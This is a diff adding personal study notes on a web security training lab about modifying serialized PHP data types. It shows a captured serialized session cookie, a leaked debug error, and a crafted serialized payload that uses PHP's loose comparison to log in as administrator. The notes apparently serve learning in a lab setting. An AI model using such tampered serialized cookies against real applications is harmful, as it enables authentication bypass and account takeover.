@@ -75,4 +75,9 @@ if ($login['password'] == $password) {
 * I was able to identify the admin panel by refreshing my account page with the altered session token, and the option appeared. I could use match and replace to make this easier.
 
 #### Lab: Modifying Serialized Data Types
-- 
+- Identified session-based serialization: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hfamki0prqs03xdfocg7x81tbg93o2ac";}` as a cookie. I also noticed that when you get /my-account, the parameter accepts the parameter `wiener` - this ended up being a rabbit hole. Let's get back to the basics, and by that, I mean the comparison vulnerabilities we just chatted about in earlier versions of PHP.
+- I managed to cause a fatal PHP error by tooling around with integers, let's take a look. Reminder, -> in PHP is the object operator, it allows you to access properties that belong to a specific object (in this case, $user is the object, and username is what we want). 
+```
+PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, $user->;access_token = 1, $access_tokens = [xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx]) Invalid access token for user carlos in /var/www/index.php:8
+```
+- `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}`
